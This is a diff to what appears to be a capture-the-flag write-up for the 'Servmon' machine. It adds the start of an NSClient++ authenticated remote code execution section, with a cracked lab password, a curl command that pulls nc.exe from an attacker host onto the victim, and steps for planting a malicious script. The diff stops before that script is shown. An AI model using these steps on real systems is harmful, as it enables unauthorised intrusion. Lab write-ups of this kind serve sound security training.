@@ -466,7 +466,7 @@ We have a valid match -> Nadine:L1k3B1gBut7s@W0rk
 
 <br />
 
-# SSH - Nadine:
+## SSH - Nadine:
 
 <br />
 
@@ -550,5 +550,62 @@ We can now access the `admin` panel without any issues:
 <br />
 
 ![7](../../../assets/images/Servmon/7.png)
+
+<br />
+
+## NSClient++ Authenticated RCE:
+
+<br />
+
+After doing some research, we find an interesting `authenticated rce` for NSClient 0.5.2.35 on [Exploit-DB](https://www.exploit-db.com/exploits/46802).
+
+<br />
+
+The `exploit` includes all the steps to perform the attack.
+
+It involves enabling a `module` to execute external scripts, and then scheduling a `malicious` script to run commands on the victim system.
+
+Let's do it:
+
+<br />
+
+1.- Upload nc.exe to the victim machine:
+
+This is the easiest step, we simply serve `nc.exe` from our attacker machine and download it using `curl`:
+
+<br />
+
+
+```bash
+nadine@SERVMON C:\Users\Nadine\Desktop>curl http://10.10.14.15/nc.exe -o nc.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 45272  100 45272    0     0  45272      0  0:00:01 --:--:--  0:00:01  257k
+
+nadine@SERVMON C:\Users\Nadine\Desktop>dir 
+ Volume in drive C has no label.
+ Volume Serial Number is 20C1-47A1
+
+ Directory of C:\Users\Nadine\Desktop
+
+04/19/2025  10:34 AM    <DIR>          .
+04/19/2025  10:34 AM    <DIR>          ..
+04/19/2025  10:34 AM            45,272 nc.exe      
+04/19/2025  09:43 AM                34 user.txt    
+               2 File(s)         45,306 bytes      
+               2 Dir(s)   6,342,979,584 bytes free
+```
+
+<br />
+
+2.- Create the malicious external script:
+
+To do this, go to the NSClient++ panel, click on `“Settings”`, then `“External Scripts”`, followed by `“Scripts”`, and finally press `“Add new”`.
+
+Now we fill in all the required fields for the script creation:
+
+<br />
+
+
 
 <br />
